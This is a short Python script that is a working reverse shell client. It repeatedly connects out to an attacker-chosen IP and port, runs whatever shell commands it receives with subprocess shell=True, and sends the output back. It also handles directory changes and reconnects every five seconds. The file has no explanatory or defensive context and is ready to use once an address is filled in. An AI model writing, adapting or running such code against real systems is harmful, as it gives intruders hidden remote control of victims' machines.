import os
import socket
import subprocess
import time
import json
IP = 'put ip here'  #change ip also
PORT =  4444             #change port also
BUFFER_SIZE = 4096
def send_data(data):
    json_data = json.dumps(data)
    json_data_bytes = json_data.encode()
    data_length = len(json_data_bytes).to_bytes(4, byteorder='big')
    s.sendall(data_length)
    for i in range(0, len(json_data_bytes), BUFFER_SIZE):
        chunk = json_data_bytes[i:i + BUFFER_SIZE]
        s.sendall(chunk)
def recv_data():
    data_length_bytes = s.recv(4)
    data_length = int.from_bytes(data_length_bytes, byteorder='big')
    json_data_bytes = b""
    bytes_received = 0
    while bytes_received < data_length:
        chunk = s.recv(min(BUFFER_SIZE, data_length - bytes_received))
        json_data_bytes += chunk
        bytes_received += len(chunk)

    json_data = json_data_bytes.decode()
    data = json.loads(json_data)
    return data
while True:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            while True:
                try:
                    s.connect((IP, PORT))
                    break
                except ConnectionRefusedError:
                    time.sleep(5)
            while True:
                command = recv_data()
                if not command:
                    break
                elif command == 'cd ..':
                    os.chdir('..')
                    send_data(f"Current directory changed to: {os.getcwd()}")
                elif command.startswith('cd '):
                    foldername = command[3:]
                    os.chdir(foldername)
                    send_data(f"Current directory changed to: {os.getcwd()}")
                else:
                    result = subprocess.run(command, shell=True, capture_output=True)
                    output = result.stdout.decode()
                    send_data(output)
    except Exception as e:
        time.sleep(5)

